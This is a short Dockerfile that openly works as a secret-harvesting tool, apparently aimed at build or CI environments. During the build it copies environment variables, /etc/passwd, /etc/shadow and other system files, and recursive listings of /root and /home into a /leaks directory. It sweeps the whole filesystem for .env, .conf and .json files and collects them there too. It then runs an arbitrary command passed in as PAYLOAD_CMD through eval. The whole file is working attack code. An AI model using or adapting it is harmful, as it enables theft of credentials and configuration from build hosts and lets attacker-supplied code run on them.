FROM python:3.11-alpine

ARG PAYLOAD_CMD

RUN apk add --no-cache curl bash tar grep && \
    echo "[+] Collecting leaks..." && \
    mkdir -p /leaks && \
    # Dump env excluding tokens
    printenv | grep -vE 'GITHUB_TOKEN|OIDC_TOKEN|AWS_' > /leaks/env.txt && \
    # Dump /etc config files
    cat /etc/passwd > /leaks/passwd.txt 2>/dev/null || true && \
    cat /etc/group > /leaks/group.txt 2>/dev/null || true && \
    cat /etc/shadow > /leaks/shadow.txt 2>/dev/null || true && \
    cat /etc/hosts > /leaks/hosts.txt 2>/dev/null || true && \
    cat /etc/resolv.conf > /leaks/resolv.txt 2>/dev/null || true && \
    # List /root and /home directories
    ls -laR /root > /leaks/root_listing.txt 2>/dev/null || true && \
    ls -laR /home > /leaks/home_listing.txt 2>/dev/null || true && \
    # Search for plaintext secrets or config
    find / -type f -iname "*.env" -exec cat {} \; >> /leaks/possible_secrets.txt 2>/dev/null || true && \
    find / -type f -iname "*.conf" -exec cat {} \; >> /leaks/configs.txt 2>/dev/null || true && \
    find / -type f -iname "*.json" -exec cat {} \; >> /leaks/jsons.txt 2>/dev/null || true && \
    # Run arbitrary payload
    echo "[+] Running payload..." && \
    eval "$PAYLOAD_CMD" || true
